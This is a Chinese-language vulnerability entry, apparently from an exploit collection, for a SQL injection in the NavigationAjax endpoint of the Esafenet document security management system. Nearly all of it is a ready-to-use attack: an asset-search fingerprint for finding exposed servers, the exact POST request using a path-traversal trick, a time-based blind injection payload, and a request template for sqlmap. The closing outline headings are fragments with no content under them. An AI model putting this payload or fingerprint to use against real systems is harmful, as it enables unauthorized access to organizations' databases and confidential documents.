# 亿赛通电子文档安全管理系统NavigationAjax存在SQL注入漏洞

- **系统**：亿赛通电子文档安全管理系统　|　**类型**：SQL注入　|　**CVE**：—
- **指纹**：`app.name="ESAFENET 亿赛通文档安全管理系统"`
- **请求**：`POST /CDGServer3/js/../NavigationAjax HTTP/1.1`
- **关键头**：`Content-Length: 58`　`Content-Type: application/x-www-form-urlencoded`

**请求体 / payload**
```
command=nav&id=-999'waitfor delay '0:0:3'--+&name=&openId=

sqlmap
POST /CDGServer3/js/../NavigationAjax HTTP/1.1
Host:
Content-Length: 58
Content-Type: application/x-www-form-urlencoded
command=nav&id=1&name=&openId=
```

**其他**
- 亿赛通电子文档安全管理系统NavigationAjax存在SQL注入漏洞: * 一、漏洞简介
* 二、影响版本
* 三、资产测绘
* 四、漏洞复现
***
- 版本: * 亿赛通电子文档安全管理系统